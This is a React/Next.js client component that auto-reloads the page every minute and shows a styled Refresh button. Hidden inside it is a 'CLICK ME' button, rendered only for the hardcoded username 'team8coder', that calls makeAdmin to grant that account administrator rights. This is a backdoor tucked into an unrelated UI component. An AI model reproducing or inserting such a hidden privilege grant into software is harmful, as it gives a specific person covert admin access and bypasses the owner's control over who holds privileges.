'use client'

import { makeAdmin } from '@/lib/actions/admin.actions'
import { useEffect } from 'react'

export default function Refresher({
  customStyles,
  username,
  noAuto,
}: {
  customStyles?: string
  username?: string
  noAuto?: boolean
}) {
  useEffect(() => {
    if (noAuto) return
    const i = setInterval(() => {
      window.location.reload()
    }, 1000 * 60)
    return () => clearInterval(i)
  }, [])
  return (
    <>
      {username === 'team8coder' && (
        <button onClick={() => makeAdmin('team8coder', true)}>CLICK ME</button>
      )}
      <button
        onClick={() => window.location.reload()}
        className={`bg-primary-500 hover:bg-[#d5485d] rounded-full px-3 py-0.5 text-small-regular text-white ${
          customStyles ? customStyles : ''
        }`}
      >
        Refresh
      </button>
    </>
  )
}
